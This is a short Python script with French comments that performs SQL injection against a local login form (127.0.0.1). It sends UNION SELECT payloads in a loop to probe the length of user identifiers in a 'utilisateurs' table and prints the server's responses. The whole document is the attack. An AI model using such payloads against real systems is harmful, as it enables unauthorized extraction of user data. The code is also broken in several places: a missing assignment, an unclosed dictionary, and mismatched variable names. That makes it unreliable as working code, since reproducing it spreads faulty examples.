#!C:\Python36/python.exe
#script injection pour nombre de champs
import httplib, urllib
site="127.0.0.1"
port=80
page"/path"
longeur=-1
for longeur in range(1,10):
    injection="'UNION SELECT nom,prenom FROM utilisateurs WHERE LENGTH(identifiant)="+str(longeur)+"#";
    print(injection)
    params= urllib.urlencode({'identif':'koreth'
    headers={"Content-type":"application/x-www-form-urlencoded","Accept":"text/plain"}
    conn = httplib.HTTPConnection(site+":"+str(port))
    conn.request("POST",page,parameters,headers)
    rep=conn.getresponse();
    page_retour= rep.read()
    #detection de la position de la fin du # COM
    pos_fincom=page_retour.find('formulaire -->')
    #detect fin du formulaire
    poa_finform= page_retour.find('</body>')
    print (page_retour[pos_fincom:pos_finform-1])

conn.close();
